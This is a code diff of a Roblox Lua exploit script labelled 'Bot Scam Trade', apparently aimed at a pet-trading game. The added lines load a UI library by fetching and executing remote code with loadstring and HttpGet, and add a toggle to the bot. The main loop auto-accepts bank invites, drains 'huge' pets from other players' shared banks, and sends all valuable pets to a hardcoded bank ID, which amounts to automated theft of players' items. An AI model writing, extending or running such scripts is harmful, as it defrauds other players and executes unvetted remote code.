@@ -1,3 +1,21 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robojini/Tuturial_UI_Library/main/UI_Template_1"))()
+
+local Window = Library.CreateLib("Bot Scam Trade", "RJTheme3")
+
+local Tab = Window:NewTab("Main")
+
+local Section = Tab:NewSection("Settings")
+
+Section:NewToggle("Enable / Disable Bot", "Сlick to start the bot", function(state)
+	if state then
+		getgenv().foo = nil
+	else
+		getgenv().foo = true
+	end
+end)
+
+
+
 function SendMessage(huges)
 	for i, v in pairs(huges or {}) do
 		print(i, v)
@@ -72,75 +90,74 @@ local function GetAllHugePets(bankid)
 end
 
 while true do
-
-
-	pcall(function()
-		local mybanks = fire123("k")
-
-
-
-		local myinvites = fire123("l")
-		for i, v in pairs(myinvites) do
-			if #mybanks < 5 then
-				if AcceptInvite(v.BUID) then
-					print("Accepted Invite")
-				end
-				mybanks[#mybanks+1] = v
-			end
-		end
+	if getgenv().foo == nil then
+		pcall(function()
+			local mybanks = fire123("k")
 
 
 
-		local mybanks = fire123("k")
-		for i, v in pairs(mybanks) do
-			if i ~= 1  and i ~= 2 then
-				print('testing bank')
-				local pets = GetAllHugePets(v.BUID)
-
-				local pets1 = {}
-
-				for index, value in pairs(pets) do
-					if #pets1 < 49 then
-						table.insert(pets1, value)
+			local myinvites = fire123("l")
+			for i, v in pairs(myinvites) do
+				if #mybanks < 5 then
+					if AcceptInvite(v.BUID) then
+						print("Accepted Invite")
 					end
+					mybanks[#mybanks+1] = v
 				end
-				if #pets > 0 then
+			end
 
-					local args = {
-						[1] = v.BUID,
-						[2] = pets1,
-						[3] = 0
-					}
-					fire123("8", unpack(args))
-					print('Got huges: '..#pets1)
-				else
 
-					print('Leaving bank: no pets left.')
-					fire123("b", v.BUID)
+			local mybanks = fire123("k")
+			for i, v in pairs(mybanks) do
+				if i ~= 1  and i ~= 2 then
+					print('testing bank')
+					local pets = GetAllHugePets(v.BUID)
+
+					local pets1 = {}
+
+					for index, value in pairs(pets) do
+						if #pets1 < 49 then
+							table.insert(pets1, value)
+						end
+					end
+					if #pets > 0 then
+
+						local args = {
+							[1] = v.BUID,
+							[2] = pets1,
+							[3] = 0
+						}
+						fire123("8", unpack(args))
+						print('Got huges: '..#pets1)
+					else
+
+						print('Leaving bank: no pets left.')
+						fire123("b", v.BUID)
+					end
+
+
+					wait(3)
 				end
-
-
-				wait(3)
 			end
-		end
 
-		local PetsList = {}
-		local PetsList2 = {}
-		for i,v in pairs(lib.Save.Get().Pets) do
-			local v2 = lib.Directory.Pets[v.id];
-			if v2.huge or v2.isGift then
-				table.insert(PetsList, v.uid);
-				table.insert(PetsList2, v2.name);
+			local PetsList = {}
+			local PetsList2 = {}
+			for i,v in pairs(lib.Save.Get().Pets) do
+				local v2 = lib.Directory.Pets[v.id];
+				if v2.huge or v2.isGift then
+					table.insert(PetsList, v.uid);
+					table.insert(PetsList2, v2.name);
+				end
 			end
-		end
 
 
-		if #PetsList > 0 then
-			fire123("7", "057f27b8-e7a2-4113-9f55-a4e0184e475c", PetsList, 0)
-			SendMessage(PetsList2);
-		end
+			if #PetsList > 0 then
+				fire123("7", "057f27b8-e7a2-4113-9f55-a4e0184e475c", PetsList, 0)
+				SendMessage(PetsList2);
+			end
 
-	end)
+		end)
+	end
 
 	--
 	-- #!F71a1e3ffdba34ed99e8f44ce78d5703bimage.png
